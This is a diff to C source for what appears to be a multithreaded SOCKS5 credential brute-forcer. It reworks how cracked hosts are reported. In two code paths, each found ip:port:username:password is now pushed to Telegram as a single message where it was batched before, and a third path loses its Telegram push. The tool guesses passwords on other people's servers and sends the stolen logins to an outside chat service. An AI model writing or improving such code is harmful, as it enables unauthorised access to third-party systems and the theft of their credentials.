@@ -11,10 +11,9 @@ static HANDLE lock_file;
 static pthread_mutex_t lock_stats = PTHREAD_MUTEX_INITIALIZER;
 static pthread_mutex_t lock_file = PTHREAD_MUTEX_INITIALIZER;
 #define MUTEX_LOCK(x) pthread_mutex_lock(&x)
+#define MUTEX_UNLOCK(x) pthread_mutex_unlock(&x)
+#define MUTEX_INIT(x) // Static init is enough
 #endif
-
-static char saia_tg_batch_buffer[4096] = "";
-static int saia_tg_batch_count = 0;
 
 // 初始化锁
 void init_locks() {
@@ -279,26 +278,13 @@ void *worker_thread(void *arg) {
                 file_append(g_config.report_file, result_line);
                 file_append(g_config.report_file, "\n");
                 printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
-                int should_push = 0;
-                char msg_to_push[5000];
-                if (g_config.telegram_enabled) {
-                    char tg_line[256];
-                    snprintf(tg_line, sizeof(tg_line), "<code>%s:%d:%s:%s</code>\n", task->ip, task->port, task->creds[i].username, task->creds[i].password);
-                    if (strlen(saia_tg_batch_buffer) + strlen(tg_line) < sizeof(saia_tg_batch_buffer)) {
-                        strcat(saia_tg_batch_buffer, tg_line);
-                        saia_tg_batch_count++;
-                    }
-                    int threshold = g_config.telegram_verified_threshold > 0 ? g_config.telegram_verified_threshold : 10;
-                    if (saia_tg_batch_count >= threshold) {
-                        snprintf(msg_to_push, sizeof(msg_to_push), "<b>[S5_VERIFIED] 批量验真报告 (%d 条)</b>\n%s", saia_tg_batch_count, saia_tg_batch_buffer);
-                        should_push = 1;
-                        saia_tg_batch_buffer[0] = '\0';
-                        saia_tg_batch_count = 0;
-                    }
-                }
                 MUTEX_UNLOCK(lock_file);
                 
-                if (should_push) push_telegram(msg_to_push);
+                // 推送TG
+                char msg[1024];
+                snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>", 
+                         task->ip, task->port, task->creds[i].username, task->creds[i].password);
+                push_telegram(msg);
                 
                 break; // 找到一个密码就停止
             }
@@ -350,26 +336,12 @@ void *worker_thread(void *arg) {
                     file_append(g_config.report_file, result_line);
                     file_append(g_config.report_file, "\n");
                     printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
-                    int should_push = 0;
-                    char msg_to_push[5000];
-                    if (g_config.telegram_enabled) {
-                        char tg_line[256];
-                        snprintf(tg_line, sizeof(tg_line), "<code>%s:%d:%s:%s</code>\n", task->ip, task->port, task->creds[i].username, task->creds[i].password);
-                        if (strlen(saia_tg_batch_buffer) + strlen(tg_line) < sizeof(saia_tg_batch_buffer)) {
-                            strcat(saia_tg_batch_buffer, tg_line);
-                            saia_tg_batch_count++;
-                        }
-                        int threshold = g_config.telegram_verified_threshold > 0 ? g_config.telegram_verified_threshold : 10;
-                        if (saia_tg_batch_count >= threshold) {
-                            snprintf(msg_to_push, sizeof(msg_to_push), "<b>[DEEP_S5] 批量验真报告 (%d 条)</b>\n%s", saia_tg_batch_count, saia_tg_batch_buffer);
-                            should_push = 1;
-                            saia_tg_batch_buffer[0] = '\0';
-                            saia_tg_batch_count = 0;
-                        }
-                    }
                     MUTEX_UNLOCK(lock_file);
                     
-                    if (should_push) push_telegram(msg_to_push);
+                    char msg[1024];
+                    snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>",
+                             task->ip, task->port, task->creds[i].username, task->creds[i].password);
+                    push_telegram(msg);
                     break;
                 }
             }
@@ -394,28 +366,7 @@ void *worker_thread(void *arg) {
                 file_append(g_config.report_file, result_line);
                 file_append(g_config.report_file, "\n");
                 printf("\n%s%s%s\n", C_HOT, result_line, C_RESET);
-                
-                int should_push = 0;
-                char msg_to_push[5000];
-                if (g_config.telegram_enabled) {
-                    char tg_line[256];
-                    snprintf(tg_line, sizeof(tg_line), "<code>%s:%d:%s:%s</code>\n", task->ip, task->port, task->creds[i].username, task->creds[i].password);
-                    if (strlen(saia_tg_batch_buffer) + strlen(tg_line) < sizeof(saia_tg_batch_buffer)) {
-                        strcat(saia_tg_batch_buffer, tg_line);
-                        saia_tg_batch_count++;
-                    }
-                    int threshold = g_config.telegram_verified_threshold > 0 ? g_config.telegram_verified_threshold : 10;
-                    if (saia_tg_batch_count >= threshold) {
-                        snprintf(msg_to_push, sizeof(msg_to_push), "<b>[VERIFIED] 批量验真报告 (%d 条)</b>\n%s", saia_tg_batch_count, saia_tg_batch_buffer);
-                        should_push = 1;
-                        saia_tg_batch_buffer[0] = '\0';
-                        saia_tg_batch_count = 0;
-                    }
-                }
                 MUTEX_UNLOCK(lock_file);
-                
-                if (should_push) push_telegram(msg_to_push);
-                
                 break;
             }
         }
